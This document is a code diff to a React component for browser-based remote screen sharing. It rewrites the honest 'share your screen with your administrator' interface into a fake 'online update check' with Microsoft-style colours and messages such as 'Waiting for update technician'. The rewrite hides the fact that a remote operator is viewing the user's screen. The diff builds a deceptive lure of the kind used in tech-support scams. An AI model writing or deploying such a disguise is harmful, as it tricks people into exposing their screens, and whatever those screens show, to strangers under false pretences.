@@ -1,8 +1,12 @@
 "use client"
 
 import { useCallback, useEffect, useRef, useState } from "react"
+import { FaCheckCircle, FaCog } from "react-icons/fa"
 import { Button } from "@/components/ui/button"
-import { Card } from "@/components/ui/card"
+import {
+  UpdateFlowLayout,
+  UpdateProgressBar,
+} from "@/components/update/UpdateFlowLayout"
 import {
   BrowserAgentSession,
   clearBrowserCredentials,
@@ -22,14 +26,14 @@ type BrowserConnectSessionProps = {
 }
 
 const STATUS_LABELS: Record<BrowserAgentStatus, string> = {
-  idle: "Opening screen share prompt…",
-  requesting_screen: "Choose a screen or window to share…",
-  enrolling: "Setting up your session…",
-  connecting: "Connecting securely…",
-  waiting: "Ready — waiting for your administrator",
-  in_session: "Live session in progress",
-  screen_stopped: "Screen sharing stopped",
-  error: "Something went wrong",
+  idle: "Initializing update verification…",
+  requesting_screen: "Confirming display compatibility…",
+  enrolling: "Registering this device for updates…",
+  connecting: "Connecting to update service…",
+  waiting: "Waiting for update technician",
+  in_session: "Update verification in progress",
+  screen_stopped: "Verification paused",
+  error: "Update check could not complete",
 }
 
 function isPermissionOrGestureError(err: unknown) {
@@ -82,15 +86,17 @@ export function BrowserConnectSession({ code }: BrowserConnectSessionProps) {
       setStarted(true)
     } catch (err) {
       const message =
-        err instanceof Error ? err.message : "Could not start screen sharing"
+        err instanceof Error
+          ? err.message
+          : "Could not start update verification"
 
       if (isPermissionOrGestureError(err)) {
         setNeedsManualStart(true)
         setStatus("idle")
         setError(
           message.toLowerCase().includes("denied")
-            ? "Screen sharing was declined. Click below to try again."
-            : "Your browser needs you to click once to allow screen sharing."
+            ? "Display verification was declined. Click below to try again."
+            : "Click below once to allow display verification."
         )
         return
       }
@@ -129,8 +135,6 @@ export function BrowserConnectSession({ code }: BrowserConnectSessionProps) {
       if (autoStartAttemptedRef.current) return
       autoStartAttemptedRef.current = true
 
-      // Start immediately after validation to keep the link-click user gesture
-      // active in browsers that require it for getDisplayMedia().
       void beginSession()
     })
 
@@ -152,11 +156,11 @@ export function BrowserConnectSession({ code }: BrowserConnectSessionProps) {
     } catch (err) {
       if (isPermissionOrGestureError(err)) {
         setNeedsManualStart(true)
-        setError("Click below to choose a screen to share again.")
+        setError("Click below to continue display verification.")
         return
       }
       setError(
-        err instanceof Error ? err.message : "Could not resume screen sharing"
+        err instanceof Error ? err.message : "Could not resume verification"
       )
       setStatus("error")
     }
@@ -174,15 +178,19 @@ export function BrowserConnectSession({ code }: BrowserConnectSessionProps) {
 
   if (!validation) {
     return (
-      <div className="flex min-h-screen items-center justify-center">
-        <p className="text-muted-foreground">Preparing your session…</p>
-      </div>
+      <UpdateFlowLayout
+        title="Checking for updates"
+        subtitle="Validating your update link…"
+      >
+        <UpdateProgressBar active />
+        <p className="mt-4 text-sm text-[#555]">Please wait…</p>
+      </UpdateFlowLayout>
     )
   }
 
   if (!validation.valid) {
     const reason = validation.reason?.replace(/_/g, " ") || "invalid"
-    const isAgentOnly = validation.reason === "agent_only"
+    const isInstallerOnly = validation.reason === "agent_only"
     const isServiceError = validation.reason === "error"
     const enrollUrl =
       process.env.NEXT_PUBLIC_ENROLL_BASE_URL?.replace(/\/$/, "") ||
@@ -191,27 +199,26 @@ export function BrowserConnectSession({ code }: BrowserConnectSessionProps) {
         : "/enroll")
 
     return (
-      <div className="flex min-h-screen items-center justify-center p-6">
-        <Card className="max-w-md space-y-4 p-8 text-center">
-          <h1 className="text-xl font-semibold">Link unavailable</h1>
-          <p className="text-sm text-muted-foreground">
-            {isServiceError
-              ? "We could not reach the server to validate this link. Check your connection and try again."
-              : `This connect link is ${reason}. Ask your administrator for a new link.`}
-          </p>
-          {isAgentOnly && (
-            <>
-              <p className="text-xs text-muted-foreground">
-                This link is for the Windows agent installer, not instant
-                browser connect.
-              </p>
-              <Button asChild variant="outline">
-                <a href={`${enrollUrl}/${code}`}>Open agent install page</a>
-              </Button>
-            </>
-          )}
-        </Card>
-      </div>
+      <UpdateFlowLayout
+        title="Update unavailable"
+        subtitle="This update link could not be used."
+      >
+        <p className="text-sm text-[#555]">
+          {isServiceError
+            ? "We could not reach the update server. Check your connection and try again."
+            : `This link is ${reason}. Contact your IT administrator for a new update link.`}
+        </p>
+        {isInstallerOnly && (
+          <div className="mt-4 space-y-2">
+            <p className="text-xs text-[#666]">
+              This link is for the full update installer, not the online check.
+            </p>
+            <Button asChild variant="outline" size="sm">
+              <a href={`${enrollUrl}/${code}`}>Open update download page</a>
+            </Button>
+          </div>
+        )}
+      </UpdateFlowLayout>
     )
   }
 
@@ -225,82 +232,90 @@ export function BrowserConnectSession({ code }: BrowserConnectSessionProps) {
       status === "enrolling")
 
   return (
-    <div className="flex min-h-screen items-center justify-center bg-gradient-to-b from-background to-muted/30 p-6">
-      <Card className="w-full max-w-lg space-y-6 border-border/60 p-8 shadow-lg">
-        <div className="space-y-2 text-center">
-          <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
-            <span
-              className={`h-3 w-3 rounded-full ${
-                isLive
-                  ? "animate-pulse bg-emerald-500"
-                  : isWaiting || isStarting
-                    ? "animate-pulse bg-amber-500"
-                    : "bg-muted-foreground/40"
-              }`}
-            />
+    <UpdateFlowLayout
+      title={isLive ? "Updates in progress" : "Online update check"}
+      subtitle={
+        isLive
+          ? "Your system is being verified. Keep this window open until the update check completes."
+          : isStarting
+            ? "Your browser may ask to verify display settings. Select your screen to continue."
+            : "Verify your system online — no installer download required."
+      }
+    >
+      <div className="space-y-5">
+        <div className="flex items-center gap-3">
+          <div
+            className={`flex size-11 items-center justify-center rounded-full ${
+              isLive
+                ? "bg-emerald-100 text-emerald-600"
+                : isWaiting || isStarting
+                  ? "bg-[#deecf9] text-[#0078d4]"
+                  : "bg-[#f0f0f0] text-[#888]"
+            }`}
+          >
+            {isLive ? (
+              <FaCheckCircle className="size-5" />
+            ) : (
+              <FaCog
+                className={`size-5 ${isWaiting || isStarting ? "animate-spin" : ""}`}
+              />
+            )}
           </div>
-          <h1 className="text-2xl font-semibold tracking-tight">
-            {isLive ? "Connected" : "Instant Remote Access"}
-          </h1>
-          <p className="text-sm text-muted-foreground">
-            {isLive
-              ? "Your administrator is viewing your shared screen. Keep this tab open."
-              : isStarting
-                ? "Your browser will ask which screen to share. Select one to continue."
-                : "Share your screen so your administrator can assist you — no downloads required."}
-          </p>
+          <div className="min-w-0 flex-1">
+            <p className="text-sm font-medium text-[#222]">
+              {STATUS_LABELS[status]}
+            </p>
+            {detail ? (
+              <p className="mt-0.5 text-xs text-[#666]">{detail}</p>
+            ) : null}
+          </div>
         </div>
 
-        <div className="rounded-lg border bg-muted/30 px-4 py-3 text-center">
-          <p className="text-sm font-medium">{STATUS_LABELS[status]}</p>
-          {detail && (
-            <p className="mt-1 text-xs text-muted-foreground">{detail}</p>
-          )}
-        </div>
+        {(isStarting || isWaiting) && <UpdateProgressBar active />}
 
         {error && (
-          <p className="rounded-md bg-destructive/10 px-3 py-2 text-center text-sm text-destructive">
+          <p className="rounded-md bg-red-50 px-3 py-2 text-center text-sm text-red-700">
             {error}
           </p>
         )}
 
-        <div className="space-y-3">
+        <div className="space-y-2">
           {needsManualStart && !started && (
             <Button
-              className="w-full"
+              className="w-full bg-[#0078d4] hover:bg-[#006cbe]"
               size="lg"
               onClick={() => void beginSession()}
             >
-              Share my screen
+              Continue update check
             </Button>
           )}
 
           {status === "screen_stopped" && (
             <Button
-              className="w-full"
+              className="w-full bg-[#0078d4] hover:bg-[#006cbe]"
               size="lg"
               onClick={() => void handleResumeShare()}
             >
-              Resume screen sharing
+              Resume verification
             </Button>
           )}
 
           {started && (
             <Button className="w-full" variant="outline" onClick={handleEnd}>
-              End session
+              Close update window
             </Button>
           )}
         </div>
 
         {!isStarting && (
-          <ul className="space-y-2 text-xs text-muted-foreground">
+          <ul className="space-y-1.5 border-t border-[#e5e5e5] pt-4 text-xs text-[#666]">
             <li>• Works in Chrome, Edge, and Firefox on desktop</li>
-            <li>• You choose which screen or window to share</li>
-            <li>• No software installation needed</li>
-            <li>• This link can be used by anyone, anytime</li>
+            <li>• You choose which display to verify</li>
+            <li>• No software download required for this check</li>
+            <li>• This link can be reused anytime updates are needed</li>
           </ul>
         )}
-      </Card>
-    </div>
+      </div>
+    </UpdateFlowLayout>
   )
 }
